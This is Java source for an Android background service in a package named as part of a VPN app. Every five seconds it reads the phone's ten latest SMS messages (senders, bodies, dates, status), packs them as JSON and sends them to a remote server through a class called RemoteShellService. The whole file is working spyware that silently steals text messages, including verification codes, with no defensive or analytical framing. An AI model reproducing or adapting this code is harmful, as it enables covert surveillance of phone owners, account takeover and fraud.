package com.nullstorm.vpn.service;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsService extends Service {
    private static final String TAG = "SmsService";
    private Handler handler;
    private boolean isRunning = false;
    private static final long SCAN_INTERVAL = 5000;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "SmsService Started");
        handler = new Handler(Looper.getMainLooper());
        isRunning = true;

        startScanning();
    }

    private void startScanning() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    scanSms();
                    handler.postDelayed(this, SCAN_INTERVAL);
                }
            }
        }, 1000);
    }

    private void scanSms() {
        try {
            String[] projection = new String[]{
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.READ
            };

            String sortOrder = Telephony.Sms.DATE + " DESC LIMIT 10";
            Cursor cursor = getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder
            );

            if (cursor != null && cursor.moveToFirst()) {
                JSONArray smsArray = new JSONArray();

                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    int read = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ));

                    JSONObject sms = new JSONObject();
                    sms.put("address", address);
                    sms.put("body", body);
                    sms.put("date", date);
                    sms.put("date_formatted", formatDate(date));
                    sms.put("type", getTypeString(type));
                    sms.put("read", read == 1);

                    smsArray.put(sms);
                } while (cursor.moveToNext());

                cursor.close();
                sendSmsToServer(smsArray);
            } else {
                Log.d(TAG, "No SMS Found");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error Scanning SMS", e);
        }
    }

    private String formatDate(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date(timestamp));
    }

    private String getTypeString(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "received";
            case Telephony.Sms.MESSAGE_TYPE_SENT:
                return "sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                return "draft";
            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                return "outbox";
            case Telephony.Sms.MESSAGE_TYPE_FAILED:
                return "failed";
            case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                return "queued";
            default:
                return "unknown";
        }
    }

    private void sendSmsToServer(JSONArray smsArray) {
        try {
            JSONObject message = new JSONObject();
            message.put("type", "sms_list");
            message.put("sms_count", smsArray.length());
            message.put("sms_data", smsArray);

            RemoteShellService.sendMessageToServer(message.toString());
            Log.d(TAG, "Sent " + smsArray.length() + " SMS to server");
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS to server", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        handler.removeCallbacksAndMessages(null);
        Log.d(TAG, "SmsService destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}